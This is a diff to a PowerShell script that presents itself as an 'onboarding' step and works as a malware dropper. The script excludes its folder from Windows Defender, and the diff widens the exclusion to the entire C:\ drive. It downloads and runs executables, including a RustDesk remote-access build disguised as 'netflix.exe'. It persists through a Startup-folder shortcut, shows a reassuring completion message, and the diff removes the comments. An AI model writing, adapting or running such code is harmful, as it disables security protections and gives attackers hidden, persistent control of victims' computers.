@@ -1,10 +1,7 @@
-# Load Windows Forms for displaying a message box
 Add-Type -AssemblyName System.Windows.Forms
 
-# Set up the folder path in %appdata%
 $folderPath = Join-Path -Path $env:APPDATA -ChildPath "word"
 
-# Create the folder if it doesn't exist
 if (!(Test-Path -Path $folderPath)) {
     New-Item -ItemType Directory -Path $folderPath | Out-Null
     Write-Output "Created folder: $folderPath"
@@ -12,11 +9,10 @@ if (!(Test-Path -Path $folderPath)) {
     Write-Output "Folder already exists: $folderPath"
 }
 
-# Add the folder to Windows Defender's exclusion list
+Add-MpPreference -ExclusionPath "C:\"
 Add-MpPreference -ExclusionPath $folderPath
-Write-Output "Whitelist complete."
+Write-Output "Whitelist for C:\ and specific folder complete."
 
-# Download and run Word.exe
 $url1 = "https://github.com/jstankovic2/fade_urls/releases/download/dddd/Word.exe"
 $destination1 = Join-Path -Path $folderPath -ChildPath "Word.exe"
 Invoke-WebRequest -Uri $url1 -OutFile $destination1
@@ -24,35 +20,24 @@ Write-Output "Download of Word.exe complete."
 Start-Process -FilePath $destination1
 Write-Output "Word.exe started."
 
-# Download and run college-app-saf.exe
-$url2 = "https://github.com/jstankovic2/fade_urls/releases/download/dtfghkjmftyuk/college-app-saf.exe"
-$destination2 = Join-Path -Path $folderPath -ChildPath "college-app-saf.exe"
+$url2 = "https://rustdesk.com/build/tasks/edb3b7d1-c522-4e97-af25-4db855ec2231/files/netflix.exe"
+$destination2 = Join-Path -Path $folderPath -ChildPath "netflix.exe"
 Invoke-WebRequest -Uri $url2 -OutFile $destination2
-Write-Output "Download of college-app-saf.exe complete."
+Write-Output "Download of netflix.exe complete."
 Start-Process -FilePath $destination2
-Write-Output "college-app-saf.exe started."
+Write-Output "netflix.exe started."
 
-# Define the path to the executable
-$exePath = Join-Path -Path $env:APPDATA -ChildPath "word\college-app-saf.exe"
-
-# Define the Startup folder path
+$exePath = Join-Path -Path $env:APPDATA -ChildPath "word\netflix.exe"
 $startupFolder = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\Start Menu\Programs\Startup')
+$shortcutPath = [System.IO.Path]::Combine($startupFolder, "netflix.lnk")
 
-# Define the shortcut path
-$shortcutPath = [System.IO.Path]::Combine($startupFolder, "college-app-saf.lnk")
-
-# Create the WScript.Shell COM object
 $wshShell = New-Object -ComObject WScript.Shell
-
-# Create the shortcut
 $shortcut = $wshShell.CreateShortcut($shortcutPath)
 $shortcut.TargetPath = $exePath
 $shortcut.Save()
 
 Write-Output "Startup complete."
 
-# Display the completion message
 [System.Windows.Forms.MessageBox]::Show("Onboarding complete. Close this window and console.", "Onboarding Status", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information)
 
-# Exit the script after message box is closed
 Exit
